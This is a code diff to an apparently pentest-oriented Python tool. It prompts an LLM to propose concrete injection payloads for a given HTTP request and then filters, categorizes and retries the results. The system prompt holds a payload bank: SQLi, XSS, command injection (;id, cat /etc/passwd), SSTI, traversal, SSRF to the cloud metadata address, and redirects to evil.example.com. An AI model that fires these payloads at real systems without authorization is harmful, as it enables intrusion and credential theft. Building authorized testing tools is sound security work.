@@ -178,30 +178,29 @@ async def ai_generate_variants(base_payload: str, category: str = "", waf: str =
         return {"error": f"AI 변형 오류: {e}"}
 
 
-_SUGGEST_SYSTEM = (
-    "You are a web app pentest planner (authorized testing). Given one HTTP request (Host removed), "
-    "propose payload candidates as JSON. HARD RULES:\n"
-    "- location MUST be 'param' (existing query param), 'path' (append to URL path), or 'body'. "
-    "Use 'header' ONLY for Host / X-Forwarded-For / X-Forwarded-Host / X-Original-URL / Referer.\n"
-    "- NEVER use User-Agent, Content-Type, Accept, or Accept-* as an injection target. Do not put "
-    "payloads in them. If you have no query param, use 'path'.\n"
-    "- Identify the app from the path and pick fitting tests. Examples: "
-    "/manager* = Tomcat Manager -> path auth-bypass '/manager/html/..;/', read '/..;/WEB-INF/web.xml'. "
-    "/autodiscover* = MS Exchange -> path traversal, SSRF via path, CVE-2021-26855(ProxyLogon)-style path. "
-    "/.env /.git = secret file read. /actuator* = Spring Boot (/actuator/env, /actuator/heapdump). "
-    "/wp-* = WordPress. If a query param exists, test it for sqli/xss/lfi/etc.\n"
-    "- 6-8 DISTINCT candidates, no duplicates.\n"
-    "Output ONLY this JSON (no prose):\n"
-    '{"test_type":"app/endpoint","summary":"Korean 1 sentence",'
-    '"candidates":[{"category":"sqli|xss|lfi|ssrf|cmdi|ssti|redirect|idor|nosql|authbypass|other",'
-    '"location":"param|path|body|header","param":"name or empty for path",'
-    '"payload":"string","why":"Korean short"}]}\n'
-    "EXAMPLE for GET /autodiscover/autodiscover.json (no params):\n"
-    '{"test_type":"MS Exchange Autodiscover","summary":"Exchange Autodiscover 엔드포인트 - 경로 기반 취약점 점검",'
-    '"candidates":[{"category":"authbypass","location":"path","param":"","payload":"/autodiscover/..;/ecp/",'
-    '"why":"경로 세그먼트 우회로 ECP 접근 시도"},{"category":"lfi","location":"path","param":"",'
-    '"payload":"/autodiscover/../../../../etc/passwd","why":"경로 traversal 파일 읽기"}]}'
-)
+_SUGGEST_SYSTEM = '''You are a web app pentest planner (authorized testing). Given one HTTP request (Host removed), propose payload candidates as JSON. HARD RULES:
+- Each "payload" MUST be a CONCRETE, literal, ready-to-send string that actually triggers the test. NEVER a description or placeholder. FORBIDDEN examples: "shell command", "{{shell command}}", "PAYLOAD", "your payload", "<command>", "[payload]". Use REAL values from the PAYLOAD BANK below.
+- location MUST be "param" (existing query/body param), "path" (append to URL path), or "body". Use "header" ONLY for Host / X-Forwarded-For / X-Forwarded-Host / X-Original-URL / Referer.
+- NEVER use User-Agent, Content-Type, Accept, or Accept-* as an injection target.
+- Identify the app from the path and pick fitting tests: /manager* = Tomcat Manager; /autodiscover* = MS Exchange (ProxyLogon path); /.env /.git = secret file read; /actuator* = Spring Boot; /wp-* = WordPress. If a query/body param exists, inject the payload INTO that param.
+- 6-8 DISTINCT candidates, no duplicates. Prefer categories that fit the endpoint/param.
+
+PAYLOAD BANK (use these exact styles; pick real values, never placeholders):
+  sqli: ' OR '1'='1     1' ORDER BY 5-- -     ' UNION SELECT NULL,NULL-- -     1 AND SLEEP(5)-- -
+  xss:  <script>alert(1)</script>     "><img src=x onerror=alert(1)>     '-alert(1)-'
+  cmdi: ;id     | id     $(id)     `id`     ;cat /etc/passwd     & whoami
+  ssti: {{7*7}}     ${7*7}     #{7*7}     <%= 7*7 %>     {{7*'7'}}
+  lfi:  ../../../../etc/passwd     ....//....//etc/passwd     /etc/passwd%00
+  ssrf: http://127.0.0.1:80/     http://169.254.169.254/latest/meta-data/     file:///etc/passwd
+  redirect: //evil.example.com     https://evil.example.com     @evil.example.com
+  nosql: ' || '1'=='1     [$ne]=     {"$gt":""}
+  path/authbypass: /..;/     ..%2f..%2f     /%2e%2e/     /manager/html/..;/
+
+Output ONLY this JSON (no prose):
+{"test_type":"app/endpoint","summary":"Korean 1 sentence","candidates":[{"category":"sqli|xss|lfi|ssrf|cmdi|ssti|redirect|idor|nosql|authbypass|other","location":"param|path|body|header","param":"name or empty for path","payload":"string","why":"Korean short"}]}
+
+EXAMPLE for POST with body {"q":"test"} (param q exists):
+{"test_type":"검색 파라미터 q","summary":"검색 파라미터 q에 대한 인젝션 점검","candidates":[{"category":"sqli","location":"body","param":"q","payload":"' OR '1'='1","why":"불린 기반 SQL 인젝션"},{"category":"xss","location":"body","param":"q","payload":"<script>alert(1)</script>","why":"반사형 XSS"},{"category":"cmdi","location":"body","param":"q","payload":";id","why":"OS 명령 주입"},{"category":"ssti","location":"body","param":"q","payload":"{{7*7}}","why":"템플릿 평가 결과 49 확인"}]}'''
 
 
 def _salvage_candidates(text: str) -> list:
@@ -246,6 +245,60 @@ def _salvage_candidates(text: str) -> list:
     return out
 
 
+# 실제 페이로드가 아니라 설명/자리표시자를 뱉은 후보를 걸러낸다(소형 모델 품질 방어)
+_PLACEHOLDER_MARKERS = (
+    "shell command", "your payload", "your command", "arbitrary command",
+    "some command", "command here", "placeholder", "insert payload",
+    "put your", "<command>", "<payload>", "[command]", "[payload]",
+    "example payload", "payload here", "malicious command",
+)
+
+
+def _is_placeholder_payload(payload: str) -> bool:
+    p = (payload or "").strip().lower()
+    if not p:
+        return True
+    if any(m in p for m in _PLACEHOLDER_MARKERS):
+        return True
+    # 영어 단어만으로 이뤄져 인젝션 문자가 전혀 없는 설명형 문자열(예: "shell command")
+    if re.fullmatch(r"[a-z][a-z ]{2,}", p) and not re.search(r"[<>{}$;|&'\"=/()\\.]", payload):
+        return True
+    return False
+
+
+_KNOWN_CATS = {"sqli", "xss", "lfi", "ssrf", "cmdi", "ssti",
+               "redirect", "idor", "nosql", "authbypass", "other"}
+
+
+def _infer_category(payload: str) -> str:
+    """모델이 category 를 스키마 문자열('sqli|xss|...')로 뱉거나 빠뜨린 경우 payload 로 추론."""
+    p = (payload or "").lower()
+    if any(t in payload for t in ("{{", "${", "#{", "<%=")):
+        return "ssti"
+    if "<script" in p or "onerror=" in p or "alert(" in p or "<img" in p:
+        return "xss"
+    if any(t in p for t in ("$ne", "$gt", "$where", "[$")):
+        return "nosql"
+    if any(t in p for t in ("union select", "or '1'='1", " or 1=1", "order by", "sleep(", "-- -", "waitfor delay")):
+        return "sqli"
+    if any(t in p for t in ("169.254.169.254", "file://", "http://127.", "http://localhost", "gopher://", "dict://")):
+        return "ssrf"
+    if "..;/" in p or "%2e%2e" in p or "..%2f" in p:
+        return "authbypass"
+    if any(t in p for t in ("../", "..\\", "/etc/passwd", "%00", "..//")):
+        return "lfi"
+    if p.startswith(("//", "@", "http://evil", "https://evil")) or "\\evil" in p:
+        return "redirect"
+    if any(payload.strip().startswith(t) for t in (";", "|", "&", "$(", "`")) or "whoami" in p or ";id" in p:
+        return "cmdi"
+    return "other"
+
+
+def _norm_category(cat: str, payload: str) -> str:
+    c = (cat or "").strip().lower()
+    return c if c in _KNOWN_CATS else _infer_category(payload)
+
+
 async def ai_suggest_payloads(method: str, path: str, params: dict,
                               body: str = "", header_names=None, count: int = 8) -> dict:
     """요청(호스트 제외)을 보고 테스트 종류 인식 + 후보 payload 생성. 응답 데이터는 보내지 않음."""
@@ -267,66 +320,80 @@ async def ai_suggest_payloads(method: str, path: str, params: dict,
             {"role": "system", "content": _SUGGEST_SYSTEM},
             {"role": "user", "content": user},
         ],
-        "temperature": 0.4,
-        "max_tokens": 1100,
+        "temperature": 0.3,
+        "max_tokens": 1500,
     }
     headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
+    # 헤더 주입이 의미 있는 헤더만 허용 (일반 헤더 남용 방지)
+    INJECTABLE_HEADERS = {
+        "host", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
+        "x-original-url", "x-rewrite-url", "referer", "true-client-ip",
+        "x-real-ip", "forwarded", "cf-connecting-ip", "x-host", "x-custom-ip-authorization",
+    }
     try:
-        async with httpx.AsyncClient(timeout=_timeout()) as client:
-            r = await client.post(f"{base_url}/chat/completions", headers=headers, json=payload)
-        if r.status_code != 200:
-            return {"error": f"NVIDIA API {r.status_code}: {r.text[:200]}"}
-        content = r.json()["choices"][0]["message"]["content"]
-        try:
-            parsed = _extract_json(content)
-            cands = parsed.get("candidates") or []
-            test_type = str(parsed.get("test_type", ""))
-            summary = str(parsed.get("summary", ""))
-        except json.JSONDecodeError:
-            # 응답이 max_tokens 등으로 잘렸을 때: 완성된 후보 객체만 살려낸다
-            cands = _salvage_candidates(content)
-            if not cands:
-                return {"error": "AI 후보 응답 파싱 실패"}
-            mt = re.search(r'"test_type"\s*:\s*"([^"]*)"', content)
-            ms = re.search(r'"summary"\s*:\s*"([^"]*)"', content)
-            test_type = (mt.group(1) if mt else "(부분 파싱)")
-            summary = (ms.group(1) if ms else "") + " ⚠️ 응답이 잘려 일부 후보만 표시"
-        # 헤더 주입이 의미 있는 헤더만 허용 (일반 헤더 남용 방지)
-        INJECTABLE_HEADERS = {
-            "host", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
-            "x-original-url", "x-rewrite-url", "referer", "true-client-ip",
-            "x-real-ip", "forwarded", "cf-connecting-ip", "x-host", "x-custom-ip-authorization",
-        }
-        # 방어적 정규화 + 품질 필터
-        norm, seen = [], set()
-        for c in cands:
-            if not isinstance(c, dict) or not c.get("payload"):
-                continue
-            loc = str(c.get("location", "param")).lower()
-            if loc not in ("param", "path", "body", "header"):
-                loc = "param"
-            param = str(c.get("param", ""))
-            # 일반 헤더(User-Agent/Content-Type 등)에 주입류를 꽂은 후보는 버림
-            if loc == "header" and param.lower() not in INJECTABLE_HEADERS:
-                continue
-            payload = str(c.get("payload"))
-            key = (loc, param.lower(), payload)
-            if key in seen:      # 중복 제거
-                continue
-            seen.add(key)
-            norm.append({
-                "category": str(c.get("category", "other")),
-                "param": param,
-                "location": loc,
-                "payload": payload,
-                "why": str(c.get("why", "")),
-            })
-        return {
-            "test_type": test_type,
-            "summary": summary,
-            "candidates": norm[:count],
-            "model": model,
-        }
+        last_err = "AI 후보 응답 파싱 실패"
+        # 소형 모델은 간헐적으로 파싱 불가/빈 응답을 냄 → 최대 2회 시도
+        for attempt in range(2):
+            async with httpx.AsyncClient(timeout=_timeout()) as client:
+                r = await client.post(f"{base_url}/chat/completions", headers=headers, json=payload)
+            if r.status_code != 200:
+                return {"error": f"NVIDIA API {r.status_code}: {r.text[:200]}"}
+            content = r.json()["choices"][0]["message"]["content"]
+            summary_suffix = ""
+            try:
+                parsed = _extract_json(content)
+                cands = parsed.get("candidates") or []
+                test_type = str(parsed.get("test_type", ""))
+                summary = str(parsed.get("summary", ""))
+            except json.JSONDecodeError:
+                # 응답이 max_tokens 등으로 잘렸을 때: 완성된 후보 객체만 살려낸다
+                cands = _salvage_candidates(content)
+                if not cands:
+                    last_err = "AI 후보 응답 파싱 실패"
+                    continue   # 재시도
+                mt = re.search(r'"test_type"\s*:\s*"([^"]*)"', content)
+                ms = re.search(r'"summary"\s*:\s*"([^"]*)"', content)
+                test_type = (mt.group(1) if mt else "(부분 파싱)")
+                summary = (ms.group(1) if ms else "")
+                summary_suffix = " ⚠️ 응답이 잘려 일부 후보만 표시"
+
+            # 방어적 정규화 + 품질 필터
+            norm, seen = [], set()
+            for c in cands:
+                if not isinstance(c, dict) or not c.get("payload"):
+                    continue
+                loc = str(c.get("location", "param")).lower()
+                if loc not in ("param", "path", "body", "header"):
+                    loc = "param"
+                param = str(c.get("param", ""))
+                # 일반 헤더(User-Agent/Content-Type 등)에 주입류를 꽂은 후보는 버림
+                if loc == "header" and param.lower() not in INJECTABLE_HEADERS:
+                    continue
+                payload_str = str(c.get("payload"))
+                if _is_placeholder_payload(payload_str):   # 'shell command' 같은 설명/자리표시자 제거
+                    continue
+                key = (loc, param.lower(), payload_str)
+                if key in seen:      # 중복 제거
+                    continue
+                seen.add(key)
+                norm.append({
+                    "category": _norm_category(c.get("category", ""), payload_str),
+                    "param": param,
+                    "location": loc,
+                    "payload": payload_str,
+                    "why": str(c.get("why", "")),
+                })
+
+            if norm:
+                return {
+                    "test_type": test_type,
+                    "summary": summary + summary_suffix,
+                    "candidates": norm[:count],
+                    "model": model,
+                }
+            last_err = "AI 후보 없음 — 다시 시도해 주세요"   # 전부 필터링됨 → 재시도
+
+        return {"error": last_err, "model": model}
     except httpx.TimeoutException:
         return {"error": "AI 응답 시간 초과 — 모델이 느리거나 요청이 큽니다. 더 빠른 모델(NVIDIA_MODEL) 사용 권장"}
     except json.JSONDecodeError:
